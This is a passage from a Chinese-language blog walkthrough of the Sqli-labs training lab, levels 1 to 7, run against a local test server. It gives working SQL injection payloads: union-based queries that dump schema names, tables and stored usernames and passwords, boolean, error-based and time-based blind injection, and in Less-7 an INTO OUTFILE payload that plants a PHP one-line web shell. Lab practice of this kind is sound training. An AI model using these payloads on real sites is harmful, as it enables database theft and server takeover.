-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-1.png" alt="1-1"></p>
-<p>查看 <code>index.php</code> 文件内对于参数<code>ID</code>的处理，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<code>单引号</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>既然多了一个<code>单引号</code>会出现报错，那想办法将这个单引号去掉，会不会不报错并且正常显示呢，试一下 <code>&#39; or 1=1 --+</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，sql语句就会变成如下这样，这条语句因or 1=1所以为永恒真</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; or 1=1 --+&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>回车后就可以看到返回的内容：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-2.png" alt="1-2"></p>
-<p>可以看到我们通过 <strong>–+</strong> 将这个多出来的<strong>单引号</strong>给注释掉了，成功返回内容</p>
-<p>那么我们就可以利用这点，执行其他我们想要执行的语句，比如 <strong>order by</strong>  (关于order by 开头有做简单介绍)</p>
-<p>首先，我们看到 <strong>security-users</strong> 表有3列</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-3.png" alt="1-3"></p>
-<p>如果我们执行 <strong>order by 3</strong> 就会成功，如果超过3就会失败，比如 <strong>order by 4</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 4 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-4.png" alt="1-4"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-5.png" alt="1-5"></p>
-<p>那么此时我们就知道了，可以利用这一点来猜某个表中有多少列</p>
-<p>当id的数据在数据库中不存在时，前台页面返回了我们构造的union 的数据。此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
-<p><strong>注意</strong>：因为前面我们已经通过 <strong>order by 3</strong> 知道该表有3列，所以这里要 <strong>select 1,2,3</strong> 不然会出错</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-6.png" alt="1-6"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-7.png" alt="1-7"></p>
-<p>此时我们就可以利用显示的位置，然后通过利用文章开头介绍的<strong>常用函数</strong>，来获取我们需要的信息，比如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,version(),database() --+</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,@@version_compile_os,@@datadir --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-8.png" alt="1-8"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-9.png" alt="1-9"></p>
-<p>结合前面的关于 <strong>information_schema</strong>  的知识，利用 <strong>union</strong> 命令进行联合注入（层层深入）</p>
-<p>爆所有数据库名（第一层）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-10.png" alt="1-10"></p>
-<p>爆security数据库的所有表名（第二层）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos; --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-11.png" alt="1-11"></p>
-<p>爆users表的所有列名（第三层）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-12.png" alt="1-12"></p>
-<p>爆具体数据（第四层）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,username,password from users where id=1--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,username,password from users where id=1--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-13.png" alt="1-13"></p>
-<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less - 2"></a>Less - 2</h2><p>同样的构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-1.png" alt="2-1"></p>
-<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，查询代码使用了整数</p>
-<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=1&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>所以这关就不需要对<strong>单引号</strong>的问题进行处理，直接尝试进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-2.png" alt="2-2"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-3.png" alt="2-3"></p>
-<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less - 3"></a>Less - 3</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-1.png" alt="3-1"></p>
-<p>因此我们得出的结果是，查询代码使用了 <strong>(‘id’)</strong> 对参数进行了处理</p>
-<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;1&apos;&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>所以这关就需要通过处理掉这个<strong>(‘$id’)</strong>，尝试进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=-1&apos;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-2.png" alt="3-2"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-3.png" alt="3-3"></p>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less - 4"></a>Less - 4</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。发现没有返回报错信息，并尝试<strong>两个单引号</strong>，也是如此.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-1.png" alt="4-1"></p>
-<p>知道将<strong>单引号</strong>改成<strong>双引号</strong>报错信息才出现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
-<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-2.png" alt="4-2"></p>
-<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>双引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>尝试进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-3.png" alt="4-3"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-4.png" alt="4-4"></p>
-<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less - 5"></a>Less - 5</h2><p>这关开始，后面的几关开始接触到盲注了。关于盲注的知识可以看这篇博客的Tip 2部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
-<p>老规矩，构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-1.png" alt="5-1"></p>
-<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。</p>
-<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>（1）布尔注入</p>
-<p>使用<strong>length()函数</strong>猜测数据库的长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=7 --+</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=8 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-2.png" alt="5-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-3.png" alt="5-3"></p>
-<p>使用<strong>substr()函数</strong>猜测数据库的名称</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;a&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;a&apos;</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;s&apos;</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;s&apos;</span><br><span class="line"></span><br><span class="line">同样，改变substr()函数里的参数，就可以截取想要猜测的字符，就这样一个个字符爆出来</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,5)=&apos;secur&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,8)=&apos;security&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),3,6)=&apos;curity&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-4.png" alt="5-4"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-5.png" alt="5-5"></p>
-<p>当然也可以使用这种方法来<strong>爆表名、列名、数据</strong>等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;a&apos; --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos; --+</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,6)=&apos;emails&apos; --+</span><br><span class="line">//当猜测出第一个表之后，改成limit 1,1 就可以猜测第二个表。关于limit的用法，不懂的话记得看前面有链接的Tips文章</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-6.png" alt="5-6"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-7.png" alt="5-7"></p>
-<p>（2）报错注入</p>
-<p>xpath报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">//爆数据库名称</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-8.png" alt="5-8"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) --+</span><br><span class="line"></span><br><span class="line">//爆表名称，同样改变limit的变量去看每个表</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-9.png" alt="5-9"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-10.png" alt="5-10"></p>
-<p>（3）延时注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;a&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,1)&gt;&apos;s&apos;),1,sleep(5)) --+</span><br><span class="line">//等待了5秒后，返回空白</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and if((substr(database(),1,8)=&apos;security&apos;),1,sleep(5)) --+</span><br><span class="line">//马上返回内容</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-11.png" alt="5-11"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-12.png" alt="5-12"></p>
-<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less - 6"></a>Less - 6</h2><p>第6关与第5关不同就是对参数ID的处理不同了，变成<strong>一个双引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-1.png" alt="6-1"></p>
-<p>我们使用xpath报错注入试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select username from users where id=2),0x3a)) --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-6/?id=1&quot; and extractvalue(1,concat(0x3a,(select password from users where id=2),0x3a)) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-2.png" alt="6-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/6-3.png" alt="6-3"></p>
-<p>其他的内容和第5关一样，只是<strong>单引号</strong>改成<strong>双引号</strong>，这里就不再赘述了</p>
-<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less - 7"></a>Less - 7</h2><p>这关接触到了<strong>dump into outfile</strong>。关于这部分知识点可以看这篇博客的Tip 3部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
-<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-<p>可以看出来这里对ID的处理是<strong>((‘id’))</strong>，那么我们就可以使用<strong>1’)) or 1=1 –+</strong>进行注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=1&apos;)) or 1=1--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-1.png" alt="7-1"></p>
-<p>那么我们现在就可以通过<strong>文件导入</strong>的方式写入文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,3 into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW.php&quot; --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-2.png" alt="7-2"></p>
-<p>可以看到虽然提示语法错误，但是我们这个<strong>HSW.php</strong>文件是已经写入的了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-3.png" alt="7-3"></p>
-<p>可以访问一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-4.png" alt="7-4"></p>
-<p>既然是可以成功写入的，那么我们就可以把写入的内容换成<strong>一句话木马</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-7/?id=-1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;HSW&quot;])?&gt;&apos; into outfile &quot;C:\\phpstudy\\WWW\\AAsqli-labs\\Less-7\\HSW2.php&quot; --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/7-5.png" alt="7-5"></p>
-<p>注意：</p>
-<ol>
